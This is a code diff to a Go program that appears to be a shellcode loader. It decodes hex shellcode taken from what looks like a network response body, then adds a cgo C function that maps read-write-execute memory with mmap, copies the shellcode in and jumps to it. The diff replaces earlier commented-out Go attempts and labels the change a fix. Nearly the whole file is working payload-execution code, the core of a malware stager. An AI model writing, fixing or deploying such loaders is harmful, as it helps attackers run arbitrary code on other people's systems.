@@ -1,5 +1,27 @@
 package main
 
+/*
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+
+void execute_shellcode(const char* shellcode, size_t size) {
+    // 1. Allocate a local RWX memory page via native C mmap
+    void* ptr = mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    if (ptr == MAP_FAILED) {
+        return;
+    }
+
+    // 2. Copy the shellcode into the RWX page
+    memcpy(ptr, shellcode, size);
+
+    // 3. Cast the pointer to a standard C function pointer and call it
+    void (*func)() = ptr;
+    func();
+}
+*/
+import "C"
+
 import (
 	"encoding/hex"
 	"fmt"
@@ -30,10 +52,10 @@ func main() {
 	code_hex := strings.TrimSpace(string(bodyBytes))
 	fmt.Printf("Shell code hex is: %s\n", code_hex)
 
-	// Remove "0x" prefixes or commas if your hex file format uses them (e.g., 0xde, 0xad)
+	// Clean up formatting
 	code_hex = strings.ReplaceAll(code_hex, "0x", "")
 	code_hex = strings.ReplaceAll(code_hex, ",", "")
-	code_hex = strings.ReplaceAll(code_hex, "\\x", "") // Handles \x90\x90 format
+	code_hex = strings.ReplaceAll(code_hex, "\\x", "")
 	code_hex = strings.ReplaceAll(code_hex, "\n", "")
 	code_hex = strings.ReplaceAll(code_hex, " ", "")
 
@@ -42,29 +64,11 @@ func main() {
 		log.Fatalf("Failed to decode shellcode : %v", err)
 	}
 	fmt.Printf("Shellcode is decoded. Byte Length: %d\n", len(shellcode))
-	fmt.Printf("Shellcod is : %s", shellcode)
 
-	// rwxMem, err := syscall.Mmap(-1, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON|syscall.MAP_PRIVATE)
-	// if err != nil {
-	// 	log.Fatalf("[-] Mmap allocation failed: %v", err)
-	// }
+	// ---- CGO FIX APPLIED HERE ----
+	fmt.Println("[+] Handing over execution context to CGO...")
 
-	// var memSlice []byte
-	// header := (*sliceHeader)(unsafe.pointer(&memSlice))
-	// header.Data = rwxMem
-	// header.Len = len(shellcode)
-	// header.Cap = len(shellcode)
-
-	// copy(rwxMem, shellcode)
-
-	// type funcval struct {
-	// 	fn uintptr
-	// }
-	// fv := funcval{fn: uintptr(unsafe.Pointer(&rwxMem[0]))}
-	// f := *(*func())(unsafe.Pointer(&fv))
-	// f()
-
-	// codeAddr := uintptr(unsafe.Pointer(&rwxMem[0]))
-	// shellcodeFunc := *(*func())(unsafe.Pointer(&codeAddr))
-	// shellcodeFunc()
+	// Convert Go slice to a C-managed pointer and execute it
+	cBytes := C.CBytes(shellcode)
+	C.execute_shellcode((*C.char)(cBytes), C.size_t(len(shellcode)))
 }
